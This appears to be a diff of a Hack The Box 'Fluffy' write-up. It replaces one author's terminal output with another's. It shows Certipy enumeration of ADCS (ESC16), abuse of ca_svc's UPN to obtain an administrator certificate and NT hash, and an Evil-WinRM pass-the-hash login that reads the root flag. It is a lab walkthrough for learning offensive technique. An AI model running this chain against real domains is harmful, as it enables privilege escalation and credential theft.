 [*] Found 11 enabled certificate templates
-[*] Finding issuance policies
-[*] Found 14 issuance policies
-[*] Found 0 OIDs linked to templates
-[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
+[*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
+[*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
 [!] Failed to connect to remote registry. Service should be starting now. Trying again...
-[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
-[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
-[!] Error checking web enrollment: timed out
-[!] Use -debug to print a stacktrace
-[!] Error checking web enrollment: timed out
-[!] Use -debug to print a stacktrace
+[*] Got CA configuration for 'fluffy-DC01-CA'
 [*] Enumeration output:
 Certificate Authorities
   0
     CA Name                             : fluffy-DC01-CA
     DNS Name                            : DC01.fluffy.htb
     Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
-    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874
     Certificate Validity Start          : 2025-04-17 16:00:16+00:00
-    Certificate Validity End            : 3024-04-17 16:11:16+00:00
-    Web Enrollment
-      HTTP
-        Enabled                         : False
-      HTTPS
-        Enabled                         : False
+    Certificate Validity End            : 3024-04-17 16:12:16+00:00
+    Web Enrollment                      : Disabled
     User Specified SAN                  : Disabled
     Request Disposition                 : Issue
     Enforce Encryption for Requests     : Enabled
-    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
-    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
     Permissions
       Owner                             : FLUFFY.HTB\Administrators
       Access Rights
-        ManageCa                        : FLUFFY.HTB\Domain Admins
-                                          FLUFFY.HTB\Enterprise Admins
-                                          FLUFFY.HTB\Administrators
         ManageCertificates              : FLUFFY.HTB\Domain Admins
                                           FLUFFY.HTB\Enterprise Admins
                                           FLUFFY.HTB\Administrators
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
         Enroll                          : FLUFFY.HTB\Cert Publishers
-    [!] Vulnerabilities
-      ESC16                             : Security Extension is disabled.
-    [*] Remarks
-      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+                                          FLUFFY.HTB\Administrators
+        Read                            : FLUFFY.HTB\Administrators
 Certificate Templates                   : [!] Could not find any certificate templates
+
 
 ```
 
@@ -593,12 +1021,9 @@ Below, I outline the steps I followed. If you want a detailed explanation, feel 
 
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania]
-└─$ certipy account \
-    -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
-    -dc-ip '10.10.11.69' -user 'ca_svc' \       
-    read
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$ certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -user 'ca_svc' read
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Reading attributes for 'ca_svc':
     cn                                  : certificate authority service
@@ -607,10 +1032,6 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
     objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
     sAMAccountName                      : ca_svc
     servicePrincipalName                : ADCS/ca.fluffy.htb
-    userPrincipalName                   : administrator
-    userAccountControl                  : 66048
-    whenCreated                         : 2025-04-17T16:07:50+00:00
-    whenChanged                         : 2025-09-05T23:34:57+00:00
 
 ```
 
@@ -618,12 +1039,9 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 2. Update the victim’s UPN (ca_svc) to that of the Admin:
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania]
-└─$ certipy account \
-    -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
-    -dc-ip '10.10.11.69' -upn 'administrator' \
-    -user 'ca_svc' update
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$ certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -upn 'administrator' -user 'ca_svc' update
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Updating user 'ca_svc':
     userPrincipalName                   : administrator
@@ -634,38 +1052,30 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 3. Request a certificate using the “User” template:
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania]
-└─$ certipy req \
-    -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.10.11.69' \
-    -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' \
-    -template 'User'
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$ certipy req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
-[*] Request ID is 20
 [*] Successfully requested certificate
+[*] Request ID is 21
 [*] Got certificate with UPN 'administrator'
 [*] Certificate has no object SID
-[*] Try using -sid to set the object SID or see the wiki for more details
-[*] Saving certificate and private key to 'administrator.pfx'
-File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
-[*] Wrote certificate and private key to 'administrator.pfx'
+[*] Saved certificate and private key to 'administrator.pfx'
 
 ```
 
 4. Restore the UPN of the victim account (ca_svc):
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania]
-└─$ certipy account \
-    -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
-    -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' \
-    -user 'ca_svc' update
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$ certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Updating user 'ca_svc':
     userPrincipalName                   : ca_svc@fluffy.htb
 [*] Successfully updated 'ca_svc'
+
 
 ```
 
@@ -673,25 +1083,21 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 5. Authenticate as the administrator (due to clock skew preventing the command from working correctly, we add faketime):
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania]
-└─$ faketime -f +7h certipy auth \
-    -dc-ip '10.10.11.69' -pfx 'administrator.pfx' \
-    -username 'administrator' -domain 'fluffy.htb'
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$ certipy auth -dc-ip '10.129.232.88' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
-[*] Certificate identities:
-[*]     SAN UPN: 'administrator'
-[*] Using principal: 'administrator@fluffy.htb'
+[*] Using principal: administrator@fluffy.htb
 [*] Trying to get TGT...
 [*] Got TGT
-[*] Saving credential cache to 'administrator.ccache'
-[*] Wrote credential cache to 'administrator.ccache'
+[*] Saved credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
 
+
 ```
 
-**…BOOM!** We have obtained the administrator’s hash!
+**well well well!** We have obtained the administrator’s hash!
 
 ---
 
@@ -702,17 +1108,19 @@ There’s little to comment on. The final step is that breath of fresh air that 
 So, let’s conclude this amazing machine:
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania]
-└─$ evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$ evil-winrm -i 10.129.232.88 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
                                         
-Evil-WinRM shell v3.7
+Evil-WinRM shell v3.5
                                         
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                         
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents>
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+fluffy\administrator
+
 
 ```
 
@@ -729,7 +1137,7 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-2257edf9331bb13725a5ac5083f05bb4
+dbfeccc5a621a08d50b662808d020d27
 
 ```
 
